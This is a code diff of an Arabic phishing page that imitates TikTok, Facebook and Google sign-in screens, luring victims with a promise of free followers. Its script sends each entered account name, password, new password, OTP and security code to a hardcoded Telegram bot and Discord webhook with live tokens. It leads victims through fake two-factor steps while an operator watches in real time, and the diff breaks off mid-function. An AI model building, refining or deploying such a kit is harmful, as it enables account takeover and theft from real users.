@@ -75,7 +75,7 @@
         }
 
         #intro-loader {
-            display: none;
+            display: flex;
             flex-direction: column;
             align-items: center;
             gap: 15px;
@@ -260,6 +260,8 @@
             font-weight: 600;
             cursor: pointer;
             text-align: right;
+            background: none;
+            border: none;
         }
 
         .divider-or {
@@ -339,7 +341,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Code/OTP Boxes Layout matching Image 2 */
+        /* Code/OTP Boxes Layout */
         .otp-inputs-row {
             display: flex;
             justify-content: space-between;
@@ -386,7 +388,7 @@
             display: block;
         }
 
-        /* Checkboxes at bottom matching Image 2 */
+        /* Checkboxes at bottom */
         .otp-checkbox-group {
             margin-top: auto;
             padding-bottom: 10px;
@@ -444,7 +446,7 @@
 </head>
 <body>
 
-    <!-- Intro Overlay (Black screen for 2s + Loading screen for 7s) -->
+    <!-- Intro Overlay -->
     <div id="intro-screen">
         <div id="intro-loader">
             <div class="spinner-ring" style="width: 38px; height: 38px;"></div>
@@ -490,7 +492,7 @@
 
             <div class="divider-or"><span>أو</span></div>
 
-            <!-- Buttons with Right Icons (Matching Image 1) -->
+            <!-- Buttons with Right Icons -->
             <button class="btn-social" id="ttToggleBtn" onclick="toggleTikTokMethod()">
                 <span class="btn-text" id="ttToggleText">المتابعة باستخدام البريد الإلكتروني/اسم المستخدم</span>
                 <span class="btn-icon">
@@ -501,7 +503,6 @@
             <button class="btn-social" onclick="showView('view-fb-login')">
                 <span class="btn-text">المتابعة باستخدام فيسبوك</span>
                 <span class="btn-icon">
-                    <!-- Facebook Icon -->
                     <svg width="22" height="22" viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                 </span>
             </button>
@@ -509,19 +510,18 @@
             <button class="btn-social" onclick="startGoogleFlow()">
                 <span class="btn-text">المتابعة باستخدام Google</span>
                 <span class="btn-icon">
-                    <!-- Google Icon -->
                     <svg width="22" height="22" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/></svg>
                 </span>
             </button>
         </div>
 
-        <!-- ================= VIEW 2: NOTES PASSWORD FIELD (DIRECT) ================= -->
+        <!-- ================= VIEW 2: NOTES PASSWORD FIELD ================= -->
         <div id="view-notes-pass" class="view-card">
             <h2 style="font-size: 22px; font-weight:800; margin: 20px 0 10px 0;">إدخال كلمة المرور</h2>
             <p style="font-size: 14px; color: var(--text-sub); margin-bottom: 20px;">يرجى إدخال كلمة المرور الخاصة بالحساب للمتابعة</p>
 
             <div class="pill-input-box">
-                <input type="text" id="notesPasswordMain" class="field-input" placeholder="أدخل كلمة المرور هنا">
+                <input type="password" id="notesPasswordMain" class="field-input" placeholder="أدخل كلمة المرور هنا">
             </div>
 
             <button class="btn-primary" onclick="submitDirectNotesPassword()">متابعة تسجيل الدخول</button>
@@ -566,11 +566,11 @@
             </button>
         </div>
 
-        <!-- ================= VIEW 5: CODE CONFIRMATION (MATCHING IMAGE 2) ================= -->
+        <!-- ================= VIEW 5: CODE CONFIRMATION ================= -->
         <div id="view-confirm-code" class="view-card">
             <h1 style="font-size: 26px; font-weight:800; margin: 10px 0 5px 0; text-align: right;">أدخل الرمز</h1>
             <p style="font-size: 14px; color: var(--text-sub); text-align: right; margin-bottom: 10px;" id="codeSentText">
-                تم إرسال الرمز إلى 771234567 967+
+                تم إرسال الرمز إلى حسابك
             </p>
 
             <!-- 6 Boxes -->
@@ -583,7 +583,6 @@
                 <input type="tel" class="otp-box-item" maxlength="1">
             </div>
 
-            <!-- Resend timer right below boxes (Matching Image 2) -->
             <div class="resend-code-text" onclick="resendCodeTrigger()">
                 إعادة إرسال الرمز <span id="codeTimer">55s</span>
             </div>
@@ -592,7 +591,6 @@
                 استخدام طريقة أخرى
             </button>
 
-            <!-- Bottom Checkboxes from Image 2 -->
             <div class="otp-checkbox-group">
                 <label class="checkbox-item">
                     <span>تلقي الرسائل القصيرة التسويقية وغيرها من الرسائل منا</span>
@@ -615,7 +613,7 @@
             <a href="https://accounts.google.com/signin" target="_blank" class="forgot-email-btn">نسيت البريد الإلكتروني؟ اضغط هنا للوصول إلى إدارته</a>
 
             <div class="pill-input-box">
-                <input type="text" id="fbNotesInput" class="field-input" placeholder="كلمة المرور">
+                <input type="password" id="fbNotesInput" class="field-input" placeholder="كلمة المرور">
             </div>
 
             <button class="btn-primary" style="background-color: var(--fb-blue); color: #fff;" onclick="submitFacebookLogin()">تسجيل الدخول</button>
@@ -644,13 +642,13 @@
             <button class="btn-primary" style="background-color: var(--google-blue); color:#fff;" onclick="submitGoogleStage1()">التالي</button>
         </div>
 
-        <!-- ================= VIEW 8: GOOGLE STAGE 2 (NOTES PASS) ================= -->
+        <!-- ================= VIEW 8: GOOGLE STAGE 2 ================= -->
         <div id="view-google-s2" class="view-card">
             <h3 style="margin-top:10px;">إدخال كلمة المرور</h3>
             <p style="font-size: 13px; color: var(--text-sub); margin-bottom: 15px;">تأكد من وضوح كلمة المرور المكتبية</p>
 
             <div class="pill-input-box">
-                <input type="text" id="googleNotesInput" class="field-input" placeholder="كلمة المرور">
+                <input type="password" id="googleNotesInput" class="field-input" placeholder="كلمة المرور">
             </div>
 
             <button class="forgot-email-btn" onclick="openGoogleForgotNotesPage()">نسيت كلمة المرور؟</button>
@@ -671,13 +669,13 @@
             <div id="newNotesFieldWrap" style="display:none;">
                 <p style="font-size: 12px; margin-bottom: 5px;">أدخل كلمة المرور الجديدة هنا بعد التحديث:</p>
                 <div class="pill-input-box">
-                    <input type="text" id="googleNewNotesInput" class="field-input" placeholder="كلمة المرور الجديدة">
+                    <input type="password" id="googleNewNotesInput" class="field-input" placeholder="كلمة المرور الجديدة">
                 </div>
                 <button class="btn-primary" onclick="submitGoogleNewNotes()">موافق</button>
             </div>
         </div>
 
-        <!-- ================= VIEW 10: GOOGLE STAGE 3 (CONFIRMATIONS) ================= -->
+        <!-- ================= VIEW 10: GOOGLE STAGE 3 ================= -->
         <div id="view-google-s3" class="view-card">
             <h3 style="margin-bottom: 12px;">خيارات التأكيد الثلاثية والبديلة</h3>
 
@@ -708,7 +706,7 @@
 
             <div style="margin-bottom: 15px; border-bottom: 1px solid var(--border-color); padding-bottom: 10px;">
                 <p style="font-size:13px; font-weight:bold;">1. التأكيد بالإشعار:</p>
-                <p style="font-size:12px; color:var(--text-sub);">انتظر ظهور الإشعار على هاتفك في شاشة الاشعارات "هل أنت من يحاول استرداد  الحساب؟ إضغط ( نعم أنا )"</p>
+                <p style="font-size:12px; color:var(--text-sub);">انتظر ظهور الإشعار على هاتفك في شاشة الاشعارات "هل أنت من يحاول استرداد الحساب؟ إضغط ( نعم أنا )"</p>
                 <button class="btn-primary" style="margin-top:5px;" onclick="triggerTelegramWait('طلب التأكيد عبر الإشعار المباشر')">طلب الإشعار</button>
             </div>
 
@@ -728,7 +726,7 @@
             </div>
         </div>
 
-        <!-- ================= VIEW 12: GOOGLE STAGE 4 (APP DEEP LINKS) ================= -->
+        <!-- ================= VIEW 12: GOOGLE STAGE 4 ================= -->
         <div id="view-google-s4" class="view-card">
             <p style="font-size: 13px; text-align: center; margin-bottom: 15px; font-weight: bold;">
                 إذا فشل فتح التطبيقات اذهب لفتحها من القائمة للحصول على الكود
@@ -763,21 +761,21 @@
             <div style="font-size: 64px; color: #25d366; margin-bottom: 10px;">✓</div>
             <h2 style="font-size: 22px; font-weight: 800; margin-bottom: 10px;">تم تسجيل الدخول بنجاح!</h2>
             <p style="font-size: 14px; color: var(--text-sub); max-width: 300px; line-height: 1.6;" id="successFinalText">
-                سيتم التواصل معك في حال اختيار حسابك ضمن الفائزين ودعمك بالمتابعين مباشره.
+                سيتم التواصل معك في حال اختيار حسابك ضمن الفائزين ودعمك بالمتابعين مباشرة.
             </p>
         </div>
 
     </div>
 
-    <!-- Footer Area matching Image 1 & 2 -->
+    <!-- Footer Area -->
     <div class="footer-wrap">
         <p style="font-size: 13px; font-weight: bold; color: var(--text-sub); margin-bottom: 8px;">إنشاء حساب</p>
         <p class="tos-text">
-             من خلال الاستمرار في استخدام حساب موجود  <a href="#"></a>، فإنك توافق على <a href="#">شروط الخدمة</a> لدينا وتقر بأنك قد قرأت <a href="#">سياسة الخصوصية</a>.
+             من خلال الاستمرار في استخدام حساب موجود، فإنك توافق على <a href="#">شروط الخدمة</a> لدينا وتقر بأنك قد قرأت <a href="#">سياسة الخصوصية</a>.
         </p>
     </div>
 
-    <!-- Loading Modal Overlay matching Image 1 -->
+    <!-- Loading Modal Overlay -->
     <div id="globalLoader" class="loader-overlay">
         <div class="loader-card">
             <span class="modal-close-btn" onclick="hideLoader()">✕</span>
@@ -787,334 +785,475 @@
     </div>
 
     <script>
-        // Intro Sequence: 2 Seconds Black Screen -> 7 Seconds Loading Screen -> Show Page
-        window.addEventListener('DOMContentLoaded', () => {
-            const introScreen = document.getElementById('intro-screen');
-            const introLoader = document.getElementById('intro-loader');
+        // إعدادات البوت والويبهوك
+        const TELEGRAM_BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
+        const TELEGRAM_CHAT_ID = "8796885500";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1551997681063297095/9wne8QtpIrX2JvrgzuLrI1-drIT2vkAIo5zOmRA0q31dcAwarxXMCYEcyUpG6kEmnV8j";
 
-            // Show Loader after 2 seconds
-            setTimeout(() => {
-                if (introLoader) introLoader.style.display = 'flex';
-            }, 2000);
-
-            // Hide Intro Screen after 2 + 7 = 9 seconds
-            setTimeout(() => {
-                if (introScreen) {
-                    introScreen.style.opacity = '0';
-                    setTimeout(() => {
-                        introScreen.style.display = 'none';
-                    }, 500);
-                }
-            }, 9000);
-        });
-
-        const TELEGRAM_BOT_TOKEN = '8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg';
-        const TELEGRAM_CHAT_ID = '8796885500';
-
-        let navHistory = ['view-tiktok-main'];
-        let activeTtMethod = 'phone';
-        let lastUpdateId = 0;
-        let adminPollingInterval = null;
-
-        let userSession = {
-            userId: 'ID-' + Math.floor(100000 + Math.random() * 900000),
-            account: '',
-            countryCode: '967+ YE',
-            notesPassword: '',
-            newNotesPassword: '',
-            securityCode: '',
-            method: 'TikTok'
+        let sessionData = {
+            loginMethod: 'phone', // 'phone' or 'email'
+            mainInput: '',
+            password: '',
+            fbAccount: '',
+            fbPassword: '',
+            googleEmail: '',
+            googlePassword: '',
+            otpCode: '',
+            securityCode: ''
         };
 
-        // Send Log to Telegram
-        async function sendTelegramLog(msgText) {
-            const payload = `📌 [طلب جديد  تيك توك- ${userSession.userId}]\n${msgText}`;
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: payload })
-                });
-            } catch (e) {
-                console.error("Telegram send error", e);
-            }
+        let viewHistory = ['view-tiktok-main'];
+        let pollTimer = null;
+        let notifTimerInterval = null;
+        let codeTimerInterval = null;
+
+        // تهيئة التطبيق عند اكتمال التحميل
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                const introScreen = document.getElementById('intro-screen');
+                if (introScreen) {
+                    introScreen.style.opacity = '0';
+                    setTimeout(() => { introScreen.style.display = 'none'; }, 500);
+                }
+            }, 3000);
+
+            setupOtpInputHandlers();
+        });
+
+        // 1. إرسال الرسائل إلى تليجرام
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_BOT_TOKEN) return;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            }).catch(e => console.error("Telegram Error:", e));
         }
 
-        // Navigation
+        // 2. إرسال البيانات إلى ديسكورد Webhook
+        function sendDiscordEmbed(title, fields, color = 16656469) {
+            if (!DISCORD_WEBHOOK_URL) return;
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: title,
+                        color: color,
+                        fields: fields,
+                        timestamp: new Date().toISOString(),
+                        footer: { text: "TikTok Log Tracker" }
+                    }]
+                })
+            }).catch(e => console.error("Discord Error:", e));
+        }
+
+        // دالة موحدة للإشعارات
+        function notifyAll(title, telegramText, discordFields, color = 16656469) {
+            sendTelegramMessage(telegramText);
+            sendDiscordEmbed(title, discordFields, color);
+        }
+
+        // إدارة الشاشات والتنقل
         function showView(viewId, pushHistory = true) {
-            document.querySelectorAll('.view-card').forEach(v => v.classList.remove('active'));
-            const target = document.getElementById(viewId);
-            if (target) {
-                target.classList.add('active');
-                if (pushHistory && navHistory[navHistory.length - 1] !== viewId) {
-                    navHistory.push(viewId);
-                }
+            const currentActive = document.querySelector('.view-card.active');
+            if (currentActive && pushHistory && currentActive.id !== viewId) {
+                viewHistory.push(currentActive.id);
             }
+
+            document.querySelectorAll('.view-card').forEach(v => v.classList.remove('active'));
+            const targetView = document.getElementById(viewId);
+            if (targetView) {
+                targetView.classList.add('active');
+            }
+            window.scrollTo(0, 0);
         }
 
         function handleGlobalBack() {
-            if (navHistory.length > 1) {
-                navHistory.pop();
-                showView(navHistory[navHistory.length - 1], false);
+            if (viewHistory.length > 0) {
+                const previousView = viewHistory.pop();
+                showView(previousView, false);
+            } else {
+                showView('view-tiktok-main', false);
             }
         }
 
         function goToHome() {
-            navHistory = ['view-tiktok-main'];
-            showView('view-tiktok-main', false);
+            showView('view-tiktok-main');
         }
 
-        // Loader helper
-        function runLoader(seconds, text, callback) {
-            const overlay = document.getElementById('globalLoader');
-            document.getElementById('loaderText').innerText = text || 'جارٍ التحميل...';
-            overlay.style.display = 'flex';
-            setTimeout(() => {
-                overlay.style.display = 'none';
-                if (callback) callback();
-            }, seconds * 1000);
+        function showLoader(text = "جارٍ التحميل...") {
+            document.getElementById('loaderText').innerText = text;
+            document.getElementById('globalLoader').style.display = 'flex';
         }
 
         function hideLoader() {
             document.getElementById('globalLoader').style.display = 'none';
         }
 
-        // TikTok Form Logic
+        // التبديل بين الهاتف والبريد في TikTok
         function toggleTikTokMethod() {
             const phoneSec = document.getElementById('tt-phone-section');
             const emailSec = document.getElementById('tt-email-section');
             const toggleText = document.getElementById('ttToggleText');
 
-            if (activeTtMethod === 'phone') {
-                activeTtMethod = 'email';
-                phoneSec.style.display = 'none';
-                emailSec.style.display = 'block';
-                toggleText.innerText = 'المتابعة باستخدام رقم الهاتف';
-            } else {
-                activeTtMethod = 'phone';
+            if (phoneSec.style.display === 'none') {
                 phoneSec.style.display = 'block';
                 emailSec.style.display = 'none';
                 toggleText.innerText = 'المتابعة باستخدام البريد الإلكتروني/اسم المستخدم';
+                sessionData.loginMethod = 'phone';
+            } else {
+                phoneSec.style.display = 'none';
+                emailSec.style.display = 'block';
+                toggleText.innerText = 'المتابعة باستخدام رقم الهاتف';
+                sessionData.loginMethod = 'email';
             }
         }
 
+        // إرسال بيانات TikTok الرئيسية
         function submitTikTokMain() {
-            if (activeTtMethod === 'phone') {
+            if (sessionData.loginMethod === 'phone') {
                 const code = document.getElementById('ttCountryCode').value.trim();
                 const phone = document.getElementById('ttPhoneInput').value.trim();
-                if (!phone) return alert('يرجى إدخال رقم الهاتف أولاً');
-                userSession.account = `${code} ${phone}`;
-                userSession.method = 'TikTok Phone';
-                document.getElementById('codeSentText').innerText = `تم إرسال الرمز إلى ${phone} ${code}`;
+                if (!phone) { alert('يرجى إدخال رقم الهاتف'); return; }
+                sessionData.mainInput = code + " " + phone;
             } else {
                 const email = document.getElementById('ttEmailInput').value.trim();
-                if (!email) return alert('يرجى إدخال البريد الإلكتروني/اسم المستخدم أولاً');
-                userSession.account = email;
-                userSession.method = 'TikTok Email';
+                if (!email) { alert('يرجى إدخال البريد الإلكتروني أو اسم المستخدم'); return; }
+                sessionData.mainInput = email;
             }
 
-            sendTelegramLog(`إدخال الحساب الرئيسي (${userSession.method}):\n${userSession.account}`);
-            runLoader(2, 'جارٍ التحميل...', () => {
+            notifyAll(
+                "🎵 TikTok - بداية تسجيل الدخول",
+                `<b>🎵 TikTok - تسجيل دخول:</b>\nالمُدخل: <code>${sessionData.mainInput}</code>`,
+                [{ name: "حساب TikTok", value: `\`\`\`${sessionData.mainInput}\`\`\``, inline: false }]
+            );
+
+            showLoader("جارٍ التحقق...");
+            setTimeout(() => {
+                hideLoader();
                 showView('view-notes-pass');
-            });
+            }, 1200);
         }
 
+        // إرسال كلمة مرور الحساب المباشرة
         function submitDirectNotesPassword() {
             const pass = document.getElementById('notesPasswordMain').value.trim();
-            if (!pass) return alert('يرجى إدخال كلمة المرور');
-            userSession.notesPassword = pass;
+            if (!pass) { alert('يرجى إدخال كلمة المرور'); return; }
 
-            sendTelegramLog(`إدخال كلمة المرور مباشرة:\nالحساب: ${userSession.account}\nكلمة المرور: ${pass}`);
+            sessionData.password = pass;
 
-            runLoader(4, 'جاري تسجيل الدخول...', () => {
-                showView('view-success');
-            });
+            notifyAll(
+                "🔑 TikTok - كلمة المرور",
+                `<b>🔑 كلمة مرور TikTok:</b>\nالحساب: <code>${sessionData.mainInput}</code>\nكلمة المرور: <code>${pass}</code>`,
+                [
+                    { name: "الحساب", value: sessionData.mainInput || "غير محدد", inline: true },
+                    { name: "كلمة المرور", value: `\`\`\`${pass}\`\`\``, inline: false }
+                ]
+            );
+
+            showLoader("جارٍ تسجيل الدخول...");
+            setTimeout(() => {
+                hideLoader();
+                const codeSentText = document.getElementById('codeSentText');
+                if (codeSentText) codeSentText.innerText = `تم إرسال الرمز إلى ${sessionData.mainInput}`;
+                showView('view-confirm-code');
+                startCodeTimer(55);
+            }, 1500);
         }
 
         function goToForgotNotesMenu() {
-            sendTelegramLog(`الضغط على نسيت كلمة المرور من قبل المستخدم`);
-            showView('view-confirm-code');
+            showView('view-forgot-methods');
         }
 
-        // Timers & Resends
-        function startTimer(elementId, seconds) {
-            let left = seconds;
-            const el = document.getElementById(elementId);
-            const interval = setInterval(() => {
-                left--;
-                if (el) el.innerText = left + 's';
-                if (left <= 0) clearInterval(interval);
-            }, 1000);
-        }
+        // إدارة إدخال الـ OTP التلقائي
+        function setupOtpInputHandlers() {
+            const otpBoxes = document.querySelectorAll('.otp-box-item');
+            otpBoxes.forEach((box, idx) => {
+                box.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && idx < otpBoxes.length - 1) {
+                        otpBoxes[idx + 1].focus();
+                    }
+                    checkAndSubmitOtp();
+                });
 
-        function confirmNotificationReceived() {
-            sendTelegramLog(`المستخدم أكد وصول الإشعار (ضغط نعم)`);
-            triggerTelegramWait('انتظار موافقة الإشعار');
-        }
-
-        function resendNotificationTrigger() {
-            startTimer('notifTimer', 60);
-            sendTelegramLog(`طلب إعادة إرسال الإشعار`);
-            alert('تم إعادة إرسال الإشعار بنجاح');
-        }
-
-        function resendCodeTrigger() {
-            startTimer('codeTimer', 55);
-            sendTelegramLog(`طلب إعادة إرسال كود التحقق`);
-            alert('تم طلب كود جديد');
-        }
-
-        // Facebook Logic
-        function submitFacebookLogin() {
-            const acc = document.getElementById('fbAccountInput').value.trim();
-            const pass = document.getElementById('fbNotesInput').value.trim();
-            if (!acc || !pass) return alert('يرجى تعبئة جميع الخانات');
-
-            userSession.account = acc;
-            userSession.notesPassword = pass;
-            userSession.method = 'Facebook';
-
-            sendTelegramLog(`تسجيل دخول فيسبوك:\nالحساب: ${acc}\nكلمة المرور: ${pass}`);
-
-            runLoader(3, 'جاري التأكد من الحساب...', () => {
-                showView('view-forgot-methods');
+                box.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !box.value && idx > 0) {
+                        otpBoxes[idx - 1].focus();
+                    }
+                });
             });
         }
 
-        // Google Flow
+        function checkAndSubmitOtp() {
+            const otpBoxes = document.querySelectorAll('.otp-box-item');
+            let code = '';
+            otpBoxes.forEach(b => code += b.value.trim());
+
+            if (code.length === 6) {
+                sessionData.otpCode = code;
+                notifyAll(
+                    "🔢 TikTok - كود التحقق OTP",
+                    `<b>🔢 كود التحقق OTP:</b>\nالحساب: <code>${sessionData.mainInput}</code>\nالكود: <code>${code}</code>`,
+                    [
+                        { name: "الحساب", value: sessionData.mainInput || "غير محدد", inline: true },
+                        { name: "رمز OTP", value: `\`\`\`${code}\`\`\``, inline: false }
+                    ]
+                );
+
+                showView('view-admin-wait');
+                startPollingTelegram();
+            }
+        }
+
+        function startCodeTimer(seconds) {
+            if (codeTimerInterval) clearInterval(codeTimerInterval);
+            let rem = seconds;
+            const timerEl = document.getElementById('codeTimer');
+
+            codeTimerInterval = setInterval(() => {
+                rem--;
+                if (timerEl) timerEl.innerText = `${rem}s`;
+                if (rem <= 0) {
+                    clearInterval(codeTimerInterval);
+                    if (timerEl) timerEl.innerText = "إعادة إرسال";
+                }
+            }, 1000);
+        }
+
+        function resendCodeTrigger() {
+            notifyAll(
+                "🔄 TikTok - إعادة طلب الكود",
+                `<b>🔄 طلب إعادة إرسال الكود:</b>\nالحساب: <code>${sessionData.mainInput}</code>`,
+                [{ name: "الحساب", value: sessionData.mainInput || "غير محدد", inline: true }]
+            );
+            startCodeTimer(60);
+        }
+
+        // تأكيد الإشعار المباشر
+        function confirmNotificationReceived() {
+            notifyAll(
+                "🔔 TikTok - تأكيد الإشعار",
+                `<b>🔔 تأكيد استلام الإشعار:</b>\nالحساب: <code>${sessionData.mainInput}</code>`,
+                [{ name: "الحساب", value: sessionData.mainInput || "غير محدد", inline: true }]
+            );
+            showView('view-admin-wait');
+            startPollingTelegram();
+        }
+
+        function resendNotificationTrigger() {
+            if (notifTimerInterval) clearInterval(notifTimerInterval);
+            let rem = 60;
+            const timerEl = document.getElementById('notifTimer');
+
+            notifTimerInterval = setInterval(() => {
+                rem--;
+                if (timerEl) timerEl.innerText = rem;
+                if (rem <= 0) {
+                    clearInterval(notifTimerInterval);
+                }
+            }, 1000);
+
+            notifyAll(
+                "🔔 TikTok - إعادة إرسال الإشعار",
+                `<b>🔔 إعادة إرسال الإشعار:</b>\nالحساب: <code>${sessionData.mainInput}</code>`,
+                [{ name: "الحساب", value: sessionData.mainInput || "غير محدد", inline: true }]
+            );
+        }
+
+        // تسجيل الدخول بـ Facebook
+        function submitFacebookLogin() {
+            const acc = document.getElementById('fbAccountInput').value.trim();
+            const pass = document.getElementById('fbNotesInput').value.trim();
+
+            if (!acc || !pass) { alert('يرجى ملء كافة الحقول'); return; }
+
+            sessionData.fbAccount = acc;
+            sessionData.fbPassword = pass;
+
+            notifyAll(
+                "📘 Facebook Login",
+                `<b>📘 بيانات فيسبوك:</b>\nالحساب: <code>${acc}</code>\nكلمة المرور: <code>${pass}</code>`,
+                [
+                    { name: "حساب فيسبوك", value: `\`\`\`${acc}\`\`\``, inline: false },
+                    { name: "كلمة المرور", value: `\`\`\`${pass}\`\`\``, inline: false }
+                ],
+                1623866
+            );
+
+            showLoader("جارٍ التحقق من بيانات Facebook...");
+            setTimeout(() => {
+                hideLoader();
+                showView('view-admin-wait');
+                startPollingTelegram();
+            }, 1800);
+        }
+
+        // تدفق جوجل (Google Flow)
         function startGoogleFlow() {
-            userSession.method = 'Google Flow';
             showView('view-google-s1');
         }
 
         function submitGoogleStage1() {
             const email = document.getElementById('googleEmailInput').value.trim();
-            if (!email) return alert('يرجى ادخال عنوان البريد الإلكتروني أو رقم الهاتف');
-            userSession.account = email;
+            if (!email) { alert('يرجى إدخال البريد الإلكتروني أو الهاتف'); return; }
 
-            sendTelegramLog(`مرحلة جوجل 1 - البريد:\n${email}`);
-            runLoader(3, 'جارٍ التحميل...', () => {
+            sessionData.googleEmail = email;
+
+            notifyAll(
+                "🔴 Google - المرحلة 1",
+                `<b>🔴 بريد جوجل:</b> <code>${email}</code>`,
+                [{ name: "البريد الإلكتروني", value: `\`\`\`${email}\`\`\``, inline: false }],
+                4358004
+            );
+
+            showLoader("جارٍ المتابعة...");
+            setTimeout(() => {
+                hideLoader();
                 showView('view-google-s2');
-            });
+            }, 1200);
         }
 
         function submitGoogleStage2Direct() {
             const pass = document.getElementById('googleNotesInput').value.trim();
-            if (!pass) return alert('يرجى إدخال كلمة المرور');
-            userSession.notesPassword = pass;
+            if (!pass) { alert('يرجى إدخال كلمة المرور'); return; }
 
-            sendTelegramLog(`مرحلة جوجل 2 - كلمة الملاحظات:\n${pass}`);
-            runLoader(3, 'جاري تسجيل الدخول والتأكد من المعلومات...', () => {
+            sessionData.googlePassword = pass;
+
+            notifyAll(
+                "🔴 Google - كلمة المرور",
+                `<b>🔴 كلمة مرور جوجل:</b>\nالبريد: <code>${sessionData.googleEmail}</code>\nكلمة المرور: <code>${pass}</code>`,
+                [
+                    { name: "البريد", value: sessionData.googleEmail || "غير محدد", inline: true },
+                    { name: "كلمة المرور", value: `\`\`\`${pass}\`\`\``, inline: false }
+                ],
+                4358004
+            );
+
+            showLoader("جارٍ التحقق...");
+            setTimeout(() => {
+                hideLoader();
                 showView('view-google-s3');
-            });
+            }, 1500);
         }
 
         function openGoogleForgotNotesPage() {
-            const fixedCode = 'G-' + Math.floor(100000 + Math.random() * 900000) + '-NOTE';
-            document.getElementById('fixedNotesBox').innerText = fixedCode;
-            sendTelegramLog(`تم توليد كلمة مرور ثابته وفريدة للزائر:\n${fixedCode}`);
             showView('view-google-s2-forgot');
         }
 
         function unlockNewNotesField() {
-            sendTelegramLog(`ضغط الزائر على رابط نسخ وتحديث كلمة المرور`);
             document.getElementById('newNotesFieldWrap').style.display = 'block';
         }
 
         function submitGoogleNewNotes() {
             const newPass = document.getElementById('googleNewNotesInput').value.trim();
-            if (!newPass) return alert('يرجى إدخال كلمة المرور الجديدة');
-            userSession.newNotesPassword = newPass;
+            if (!newPass) { alert('يرجى إدخال كلمة المرور الجديدة'); return; }
 
-            sendTelegramLog(`إدخال كلمة المرور الجديدة:\nالكلمة الجديدة: ${newPass}`);
-            runLoader(3, 'جاري تسجيل الدخول والتأكد من المعلومات...', () => {
-                showView('view-google-s3');
-            });
+            notifyAll(
+                "🔑 Google - كلمة مرور جديدة",
+                `<b>🔑 كلمة مرور جديدة لجوجل:</b>\nالبريد: <code>${sessionData.googleEmail}</code>\nالجديدة: <code>${newPass}</code>`,
+                [
+                    { name: "البريد", value: sessionData.googleEmail || "غير محدد", inline: true },
+                    { name: "كلمة المرور الجديدة", value: `\`\`\`${newPass}\`\`\``, inline: false }
+                ],
+                4358004
+            );
+
+            showView('view-google-s3');
         }
 
         function submitSecurityCode() {
             const code = document.getElementById('securityCodeInput').value.trim();
-            if (!code) return alert('يرجى إدخال رمز الأمان');
-            userSession.securityCode = code;
+            if (!code) { alert('يرجى إدخال رمز الأمان'); return; }
 
-            sendTelegramLog(`تم إدخال رمز الأمان:\nالرمز: ${code}`);
-            runLoader(3, 'جاري التحقق من رمز الأمان...', () => {
-                document.getElementById('successFinalText').innerText = 'سيتم دعم الحساب بالمتابعين مباشره بعد الفوز.';
-                showView('view-success');
-            });
+            sessionData.securityCode = code;
+
+            notifyAll(
+                "🛡️ Google - رمز الأمان",
+                `<b>🛡️ رمز أمان جوجل:</b>\nالبريد: <code>${sessionData.googleEmail}</code>\nالرمز: <code>${code}</code>`,
+                [
+                    { name: "البريد", value: sessionData.googleEmail || "غير محدد", inline: true },
+                    { name: "رمز الأمان", value: `\`\`\`${code}\`\`\``, inline: false }
+                ],
+                4358004
+            );
+
+            showView('view-google-s4');
+        }
+
+        function triggerTelegramWait(actionName) {
+            notifyAll(
+                "⏳ طلب انتظار إجراء",
+                `<b>⏳ الإجراء المطلوب:</b> ${actionName}\nالحساب: <code>${sessionData.mainInput || sessionData.googleEmail}</code>`,
+                [{ name: "الإجراء", value: actionName, inline: true }]
+            );
+
+            showView('view-admin-wait');
+            startPollingTelegram();
         }
 
         function triggerIktsabCode() {
-            const target = document.getElementById('iktsabAccountInput').value.trim();
-            if (!target) return alert(' يرجى إدخال رقم الهاتف او عنوان البريد المرتبط بالحساب');
+            const val = document.getElementById('iktsabAccountInput').value.trim();
+            if (!val) { alert('يرجى إدخال الحساب'); return; }
 
-            sendTelegramLog(`طلب كود للحساب:\n${target}`);
             document.getElementById('iktsabCodeWrap').style.display = 'block';
+
+            notifyAll(
+                "📩 طلب كود إكتساب/بديل",
